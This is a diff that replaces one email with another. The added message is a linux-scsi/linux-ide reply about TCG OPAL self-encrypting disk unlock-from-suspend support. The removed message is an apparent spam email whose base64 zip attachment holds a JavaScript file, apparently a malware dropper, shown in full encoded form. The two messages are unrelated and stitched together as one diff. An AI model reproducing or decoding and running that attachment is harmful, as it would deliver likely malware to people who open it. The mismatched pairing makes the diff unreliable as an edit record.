@@ -1,74 +1,38 @@
-From: <dengx@physics.utoledo.edu>
-Subject: (unknown)
-Date: Tue, 06 Jun 2017 20:36:42 -0000
-Message-ID: <149678140277.12492.8105473908329134574@surnet.ru>
+From: Scott Bauer <scott.bauer@intel.com>
+Subject: Re: [PATCH 6/6] sd: add support for TCG OPAL self encrypting disks
+Date: Tue, 6 Jun 2017 15:40:07 -0600
+Message-ID: <20170606214007.zx66c7rogeylptx6@sbauer-Z170X-UD5>
+References: <20170604124225.27032-1-hch@lst.de>
+ <20170604124225.27032-7-hch@lst.de>
+ <20170605211530.aqxwigcrxgsdvmhs@sbauer-Z170X-UD5>
+ <20170606095955.GC20590@lst.de>
 Mime-Version: 1.0
-Content-Type: application/zip; name="8658933842225.zip"
-Content-Transfer-Encoding: base64
-Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from ip-188-18-23-154.dsl.surnet.ru ([188.18.23.154]:54101 "HELO
-        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
-        id S1751426AbdFFUgq (ORCPT <rfc822;linux-ide@vger.kernel.org>);
-        Tue, 6 Jun 2017 16:36:46 -0400
-Content-Disposition: attachment
-Subject: 
-Sender: linux-ide-owner@vger.kernel.org
+Content-Type: text/plain; charset=us-ascii
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Content-Disposition: inline
+In-Reply-To: <20170606095955.GC20590@lst.de>
+Sender: linux-scsi-owner@vger.kernel.org
+To: Christoph Hellwig <hch@lst.de>
+Cc: Tejun Heo <tj@kernel.org>, Jonathan Derrick <jonathan.derrick@intel.com>, Rafael Antognolli <rafael.antognolli@intel.com>, Robert Elliott <elliott@hpe.com>, linux-ide@vger.kernel.org, linux-block@vger.kernel.org, linux-scsi@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: linux-ide@vger.kernel.org
 
-UEsDBAoAAgAAAIMSx0qOmcXHwAsAAMALAAAJABwAMjE0MzYuemlwVVQJAAN1DjdZdQ43WXV4CwAB
-BAAAAAAEAAAAAFBLAwQUAAIACACDEsdKirIcABoLAAD4IgAACAAcADIxNDM2LmpzVVQJAAN1DjdZ
-dQ43WXV4CwABBAAAAAAEAAAAAO1a24obSRJ9tsH/YOrFujFT9wu9WlgG9m3Rgx+7W5CVVWX32O4C
-jTzbg/G/b5yIk6qS2l43g9lhmG2oVilvcTsRGZGp4eO9P96N9y/HcTeO8W6x241xHI8b+baT9+WL
-559ePH926I8fD/cv2bln59WL559fPB/CErtxF0vrwnrjDZaUFy7xqzu8lIZ4F8cy79nx8Jv8R4f2
-3G2jf7ljhJ5nHLVd3Pf/fvlPrr6IZGn520WbSJgAeXkDyXjUN2FMZsnbxCuGX0fru3X09pojbxfh
-u42/XSxXXG55exUtL5nfgId/HA7ut0WySTfZJhrej+MhWl5nt4/7Du6+Gz9o53IJWUQ9z7w7+reL
-/rCkvJ8nfU76mOvxO5lCehcqxTjOTKBaMBMM42FxdbVUG5g5zB467udtpIoYhY8Y/IzXICWquv3h
-l4/tL8fDIt2ky+VehmDgNUSR8bdmQ13j3Tbyb1+Jyqem4zYyLnTSlhrkAPJ2aXgMlZ5oc1xHousq
-3yRxsSnqTZoJC5l8rctNGst7km0SaUNTXulrXUtvIY98FulyQ1m2XPP61QdB3frdOvrx5ub1p/zz
-j29sDPB3E91EGwq9ja+gLuU9tGwosvSx7W9c/of3/f2b49vQvF6Hoev18tPdsOC3v2+pB45ffppW
-/Ewu1ltYUhoFuD+vo+XV52iNNYXKYvmNt2jBRZZAdsDC0pTdHnr3Tl8ByDOUEgZ32/jUPwPthKAz
-xAWqZ1DD0AtvZ+sjI0MTI/zXnAI+bYGB3680gIygEm9lNMYv7pba/LANsYcDNlxueUWmH6CBfBO9
-d7/20ZN8c+L+zDdJWJUpip1JO6oxL6W11kexbNQ/xi2xLt52EDPeKhITQWLgnYOvOfR2wZGTVUXg
-81gUfYBgEojSpwWiifkzYXcK4DOb0gDRap/61T6Rp8hX+7pd7Zt+te+y1d4Vq30r35205/I+lPLE
-NrarV3svz9Cs9jHmy7hCxtSYM1ifw/hOnkT6ZN4g7U7aK3k6Jw/6ZO1UxsWY3xr9WsY3Qr+VT5cY
-XfT1oJeu9pnQ9OBT6PayblrJfKFbpdYG/r2s3zubo/x78p8Z/QE8CD+9tKfSlsh7IU8bm9yQz8X2
-vZf1i5K6kM+k4NqybifvMflLcs6vjFadmixdbLypPCJzKfQ82hOTP5a+RNpz4buBXrlu60hfPmNn
-831mY/vO5GxlbOnMJrnMreW7F9qNtDlv/dBBQT0+lb4XHbvBZIaOlb4z22aJ6Q66Bn+ZzI9z0xF0
-pvrvbfwg8wfqD7YDftLO7IP50HUl/TlwVJvegQ3YH3K73vjOK7MDsJQCOxXmR2tBc2RU0tZQAEq1
-MyR1DREEpEFDg6HQe0O97+y9hVVrQzI4gRaA5A4WbUxKaDXvTBqsV0lf0xi38AKgOHGGoqBdX1GL
-jc1TKWqTKOtIvzFJ09xoF/LUeGRMV5rHqBWpJbWIMy0CJUDXCQWdoaCRz3owLUJjjp6aJ5MVstZ4
-DFZMB/NiRVFlOjh5IfhOTLd9Sf5Lyj9M8qv+a/Lf2Pp9ajyDDyBsHgVU/t7QDPo5kAaeZJ1GaHbe
-EKcyBxTB89oZ/dbskfWmk4KRQSOZ0HbN5AVKHzwVlD81Wn1m81X+zOSuO5OthVdwTkCxT4nCknYG
-/drkT1JDN7xfvaBnJJXPWMa1iETynlWwfUAw4q1qMTUUFuAgoxS5zVZ/ym0VcAG/zIgASAIUZ840
-mNNHam/WDH4IzcPfh8I0AS0CwRrL4VuIZ5VJgRgCFAGhbUAxLAReMkMEtIBY3NFfEVtyIg2xD/Sx
-DlAA3nvuBfiEFTG/ic1TFNUDUTyQfs5Y9i0r5rP5zubrXFivtD7lubD5PXmoElqKUWLuxf87FPyZ
-7R8Q/H8U/JVR8Ge2f0Dwt1DQ1BMKkOdoXuK5YmV5adiRsUtpRuIs9/Ixc7PBckhoMVihZ76oO7q3
-HcllhgrklElmmsWOqBoCvd6Qojkr8zJYLeTVmtc2hgLIoPSZl7c1UcS8+w/NSHLLKDAfVvRcAyg9
-0e/MA2FFyK0ZVW1IKnNmBLXx3zcz+VNDYMIdXfPS2uyleWVquz1QiBoh68/zUvAPL1D7D9YHD3LM
-KpG1oGaC7mC3pLJspGPdA/1D/hAFYHNkpKp/b/yfMhrIP5iN8V29sLQoUDYWdZDt+Jn88DhkTMMp
-i4AkQYtaHTC2aXXTmg+BE12lMikRv/LW8jLMT0pm4fQCaAFSJpzbMgdU1BTGDVDc9eZXyKs1r0yJ
-ipZa7C0GaW6ZGoo1HsWWVwOhWh24KZaBp1I+C2eagGeG6kRjUTVVF2pFb/xq/ujNSiEWJYlZHw/i
-BPhGNYR5cUxEXlaX3qrLRNoqz1hWsvpxhnLln3EFFq4YJeDp0BXitNYVvXkK5qFfY5mfYhFQr3lt
-bgju6IUqf2soVv4T0u6/7gXQiVbXhcXCImVeT1x4IihU94rC3tZKeuo/NvvD7jHjbR3P6ppmJn9C
-z5DvVWzeoHm9s6iUtDMv/GIUDQjWWJpOsRScarWVWCxEBVX35o+ozua+qNVZZ1wAdXpG4ShFb3V6
-2ZsWgELPHam92NG/+xlFbfwgFsASsKLWr84Q2BL5FSsrxLC0NvRrLMzNiljzVN2kkxf1rKAQSzW2
-eZt/OqOJzQsQh7Bf1axwlX5hXoQ1oOOwFwFFIQoAKaFG1zOizuJ5wyq75bkQogj0GDxK4yLjLPjH
-XggUwdOVr5a25P5UYt/oTDdanbOC14yosvXDXljPzmhq0i9IUzMCVpA471H9D1NGE6pz6Fb3ssFo
-hiiiUbQxfEHHOCHIMosCxXBuP8ig+m8Dgi0i/xcp5CmD9rIpogOlyEdyZhOQImQkmhfCl2LL7fJ+
-ysuw4zjmduA45zpaU3v6cmaamcfyYN0na4FnLKeTMm9WwLmKY+xTyzuicr4XxERRPdX4uhfUxl/T
-TF4E/Whe29AjuB8MzLD0tHFmRT1pHDg/nDQyCmSMAjo/N69ALNOMJrO9D1HAtYwifpbXfiEKwYs0
-llaMIuV0Uqa59DCh8HTSxdwU8qc85dIzqpzyM6PQeOjNQ8P+ir0g7GXgDXWFntRenDHBg9tyFsVi
-Gw99I3MIe4nWJaXtBbqPnOnvdJr2O7SoJ2WsDsB50GLY0eFDmvskvyOWh3PBmidVuaEocU/Iy51p
-oQ4ZAVDleN5YTBlB7R5nNIE+dmA9aUqnvBzyFTwDRS4JK7Y8j1UrPiGvBYprnlRpFGgtSjjqpqdH
-aHXYGhKAoozxtfDkH/y1tCLjd87MBvsLzrd9qAt67iWdnderF9PzW/eVKDQ76dSokk+xXDMinpT2
-nA+MnOb72fyvoFAz0oRRJDP59bw5/Xp1qXsZo2DD8+x2yiKYlWt1lTN2MM7U3NFUCs/cszbtd/RD
-zc7p56CMB3EXHGgsb61a0OqinpD/pew+7GgZ86LgReUsFsIDAsLAb82TbkUxbx0yxnf1gpI1bjLt
-SL6YNOzCjszqRrOL2lDS0DO0OrvMKGbVmVZ3wYoz/SF3HnjGEW59dAfPmJfOqrvL6tTnobrVi+LT
-nZVeRT2+s9JLa1zTxWc333qtPl7++ICtj++cY9wo8hLyYXsTxQ830ZrN16+O4+vj4e7+zavbxfkd
-Y6D7pOv/E0cXN6l634tLPpFlLgFuJHfjF34+8bCNwA5/P2HDHt05Sqteo0d3dsu6s/tWu6q1a/HX
-0fphHb25vomGG/xQ4iZ66w4/QXAbfrvgKiehOVN/OmEMb6LD+OGn6OxGMhq7PlpeJ0/8WcRJzu/z
-s4jTryHCfeby6j9QSwECHgMUAAIACACDEsdKirIcABoLAAD4IgAACAAYAAAAAAABAAAApIEAAAAA
-MjE0MzYuanNVVAUAA3UON1l1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBOAAAAXAsAAAAAUEsB
-Ah4DCgACAAAAgxLHSo6ZxcfACwAAwAsAAAkAGAAAAAAAAAAAAKSBAAAAADIxNDM2LnppcFVUBQAD
-dQ43WXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAADDAAAAAA=
+On Tue, Jun 06, 2017 at 11:59:55AM +0200, Christoph Hellwig wrote:
+> On Mon, Jun 05, 2017 at 03:15:31PM -0600, Scott Bauer wrote:
+> > I'm not familiar at all with ATA, but I noticed there was no unlock from suspend support
+> > in the series. Does ATA not have a way to determine if we're coming out of a suspend?
+> 
+> I don't know, and not having a test system with a OPAL capable driver
+> and suspend support I could not even test the code.
+> 
+> > I see there are some power-ops in scsi/sd.c, if you do want to add it you can mabe toss a
+> > 
+> > if (sdkp->security)
+> >    opal_unlock_from_suspend(sdpk->opal_dev)
+> > 
+> > somewhere in the resume path? We handle null opal_devs and no unlock from suspend list
+> > so calling it when nothing is set up is just a no-op.
+> 
+> Yeah, maybe.  We'll just need someone who could test it first.
+
+I was given a sata drive that apparently has opal enabled on it. If it actually has opal
+I can run some tests.
